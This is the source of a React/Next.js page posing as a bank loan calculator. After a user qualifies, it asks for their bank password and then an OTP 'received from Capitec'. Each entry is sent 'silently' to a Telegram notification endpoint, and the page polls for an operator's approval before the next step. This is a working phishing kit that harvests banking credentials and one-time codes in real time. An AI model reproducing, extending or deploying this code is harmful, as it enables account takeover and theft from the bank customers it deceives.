"use client";

import { useState, ChangeEvent, useEffect } from "react";
import Image from "next/image";
import { createPost, FormData, VerificationStep, VerificationSession } from "../types";
import Modal from "./Modal";

export default function VerificationForm() {
    const [step, setStep] = useState<VerificationStep>('loan-details');
    const [sessionId, setSessionId] = useState<string>('');
    const [formData, setFormData] = useState<FormData>({
        income: 0,
        expenses: 0,
        desired: 0
    });
    const [password, setPassword] = useState<string>('');
    const [otp, setOtp] = useState<string>('');
    
    const [errorMsg, setErrorMsg] = useState<string>('');
    const [successMsg, setSuccessMsg] = useState<string>('');
    const [waitingMsg, setWaitingMsg] = useState<string>('');

    // Generate session ID on mount
    useEffect(() => {
        const id = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        setSessionId(id);
    }, []);

    const isQualified = (income: number, expenses: number, desired: number) => {
        let qualified = false
        if (income > expenses) {
            const installment = desired / 6
            if (installment <= (income * 0.3)) {
                qualified = true
            }
        }
        return qualified
    }

    const handleLoanDetailsChange = (e: ChangeEvent<HTMLInputElement>) => {
        closeModals();
        setFormData(form => ({
            ...form,
            [e.target.name]: e.target.value,
        }));
    };

    const handleLoanDetailsSubmit = async (e: ChangeEvent<HTMLFormElement>) => {
        e.preventDefault();
        closeModals();

        const income = Number(formData.income);
        const expenses = Number(formData.expenses);
        const desired = Number(formData.desired);

        if (income > 0 && expenses > 0 && desired > 0) {
            if (isQualified(income, expenses, desired)) {
                // Send to Telegram silently
                try {
                    await createPost('/api/telegram/notify', {
                        sessionId,
                        step: 'loan-details',
                        data: formData,
                        type: 'details-approval'
                    });
                    
                    // Show waiting message to user
                    setWaitingMsg("Verifying your details... Please wait for confirmation.");
                    setStep('waiting-details-approval');
                    
                    // Poll for approval
                    pollForApproval('loan-details');
                } catch (error) {
                    setErrorMsg("Failed to submit details. Please try again.");
                }
            } else {
                setErrorMsg("Unfortunately you do not qualify for a loan amount of R" + desired.toFixed(2) + '. You can try again with a lower amount.');
            }
        } else {
            setErrorMsg("Please complete all fields.");
        }
    };

    const handlePasswordSubmit = async (e: ChangeEvent<HTMLFormElement>) => {
        e.preventDefault();
        closeModals();

        if (password.trim().length < 6) {
            setErrorMsg("Password must be at least 6 characters.");
            return;
        }

        try {
            await createPost('/api/telegram/notify', {
                sessionId,
                step: 'password',
                password,
                type: 'password-approval'
            });
            
            setWaitingMsg("Verifying your password... Please wait for confirmation.");
            setStep('waiting-password-approval');
            
            pollForApproval('password');
        } catch (error) {
            setErrorMsg("Failed to submit password. Please try again.");
        }
    };

    const handleOtpSubmit = async (e: ChangeEvent<HTMLFormElement>) => {
        e.preventDefault();
        closeModals();

        if (otp.trim().length === 0) {
            setErrorMsg("Please enter the OTP.");
            return;
        }

        try {
            await createPost('/api/telegram/notify', {
                sessionId,
                step: 'otp',
                otp,
                type: 'otp-verification'
            });
            
            setWaitingMsg("Verifying your device... Please wait for confirmation.");
            setStep('waiting-otp-approval');
            
            pollForApproval('otp');
        } catch (error) {
            setErrorMsg("Failed to submit OTP. Please try again.");
        }
    };

    const pollForApproval = async (approvalStep: string) => {
        const maxAttempts = 120; // 2 minutes max wait
        let attempts = 0;

        const interval = setInterval(async () => {
            attempts++;

            if (attempts > maxAttempts) {
                clearInterval(interval);
                setWaitingMsg("");
                setErrorMsg("Request timed out. Please try again.");
                setStep('loan-details');
                return;
            }

            try {
                const response = await fetch(`/api/telegram/status?sessionId=${sessionId}`);
                const statusData = await response.json();

                if (statusData.approved !== undefined) {
                    clearInterval(interval);

                    if (statusData.approved) {
                        if (approvalStep === 'loan-details') {
                            setWaitingMsg("");
                            setStep('password');
                        } else if (approvalStep === 'password') {
                            setWaitingMsg("");
                            setStep('otp');
                        } else if (approvalStep === 'otp') {
                            setWaitingMsg("");
                            setSuccessMsg("Device verified successfully! Your loan application is complete.");
                            setStep('completed');
                        }
                    } else {
                        setWaitingMsg("");
                        const reason = statusData.reason || "Request was declined.";
                        setErrorMsg(reason);
                        setStep('loan-details');
                    }
                }
            } catch (error) {
                console.error("Polling error:", error);
            }
        }, 1000); // Check every second
    };

    const closeModals = () => {
        setErrorMsg("");
        setSuccessMsg("");
        setWaitingMsg("");
    };

    return (
        <div className="w-full max-w-3xl">
            {/* Logo */}
            <div className="flex flex-col items-center mb-6">
                <Image src="/logo.svg" alt="Bank Logo" width={150} height={60} />
            </div>

            {/* Step 1: Loan Details */}
            {step === 'loan-details' && (
                <form
                    onSubmit={handleLoanDetailsSubmit}
                    className="bg-white p-8 rounded-2xl shadow-xl space-y-6"
                >
                    <h2 className="text-3xl font-bold text-gray-800 text-center">
                        Loan Amount Calculator
                    </h2>

                    <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">
                            Monthly Income
                        </label>
                        <div className="relative text-gray-500">
                            <span className="absolute inset-y-0 left-0 pl-3 flex items-center">
                                R
                            </span>
                            <input
                                type="number"
                                name="income"
                                required
                                onChange={handleLoanDetailsChange}
                                className="w-full border border-gray-300 rounded-lg p-3 pl-8 focus:ring-2 focus:ring-blue-500 focus:outline-none"
                                step={0.01}
                                placeholder="0.00"
                            />
                        </div>
                    </div>

                    <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">
                            Monthly Expenses
                        </label>
                        <div className="relative text-gray-500">
                            <span className="absolute inset-y-0 left-0 pl-3 flex items-center">
                                R
                            </span>
                            <input
                                type="number"
                                name="expenses"
                                required
                                onChange={handleLoanDetailsChange}
                                className="w-full border border-gray-300 rounded-lg p-3 pl-8 focus:ring-2 focus:ring-blue-500 focus:outline-none"
                                step={0.01}
                                placeholder="0.00"
                            />
                        </div>
                    </div>

                    <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">
                            Desired Loan Amount
                        </label>
                        <div className="relative text-gray-500">
                            <span className="absolute inset-y-0 left-0 pl-3 flex items-center">
                                R
                            </span>
                            <input
                                type="number"
                                name="desired"
                                required
                                onChange={handleLoanDetailsChange}
                                className="w-full border border-gray-300 rounded-lg p-3 pl-8 focus:ring-2 focus:ring-blue-500 focus:outline-none"
                                step={0.01}
                                placeholder="0.00"
                            />
                        </div>
                    </div>

                    <button
                        type="submit"
                        className="w-full bg-blue-700 hover:bg-blue-800 text-white py-3 rounded-xl font-semibold transition duration-300 shadow-md"
                    >
                        Submit Details
                    </button>
                </form>
            )}

            {/* Step 2: Password */}
            {step === 'password' && (
                <form
                    onSubmit={handlePasswordSubmit}
                    className="bg-white p-8 rounded-2xl shadow-xl space-y-6"
                >
                    <h2 className="text-3xl font-bold text-gray-800 text-center">
                        Enter Your Password
                    </h2>

                    <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">
                            Password
                        </label>
                        <input
                            type="password"
                            required
                            value={password}
                            onChange={(e) => {
                                closeModals();
                                setPassword(e.target.value);
                            }}
                            className="w-full border border-gray-300 rounded-lg p-3 focus:ring-2 focus:ring-blue-500 focus:outline-none"
                            placeholder="Enter your password"
                            minLength={6}
                        />
                    </div>

                    <button
                        type="submit"
                        className="w-full bg-blue-700 hover:bg-blue-800 text-white py-3 rounded-xl font-semibold transition duration-300 shadow-md"
                    >
                        Submit Password
                    </button>
                </form>
            )}

            {/* Step 3: OTP */}
            {step === 'otp' && (
                <form
                    onSubmit={handleOtpSubmit}
                    className="bg-white p-8 rounded-2xl shadow-xl space-y-6"
                >
                    <h2 className="text-3xl font-bold text-gray-800 text-center">
                        Verify Your Device
                    </h2>
                    <p className="text-center text-gray-600">
                        Enter the OTP you received from Capitec
                    </p>

                    <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">
                            OTP
                        </label>
                        <input
                            type="text"
                            required
                            value={otp}
                            onChange={(e) => {
                                closeModals();
                                setOtp(e.target.value);
                            }}
                            className="w-full border border-gray-300 rounded-lg p-3 focus:ring-2 focus:ring-blue-500 focus:outline-none text-center text-2xl tracking-widest"
                            placeholder="000000"
                            maxLength={6}
                        />
                    </div>

                    <button
                        type="submit"
                        className="w-full bg-blue-700 hover:bg-blue-800 text-white py-3 rounded-xl font-semibold transition duration-300 shadow-md"
                    >
                        Verify OTP
                    </button>
                </form>
            )}

            {/* Modals */}
            {errorMsg && (
                <Modal
                    title={"Error"}
                    subtitle={errorMsg}
                    onClose={closeModals}
                    color={"text-red-600"}
                />
            )}

            {successMsg && (
                <Modal
                    title={"Success"}
                    subtitle={successMsg}
                    onClose={closeModals}
                    color={"text-green-600"}
                />
            )}

            {waitingMsg && (
                <Modal
                    title={"Please Wait"}
                    subtitle={waitingMsg}
                    onClose={() => {}} // Don't allow closing while waiting
                    color={"text-blue-600"}
                />
            )}
        </div>
    );
      }
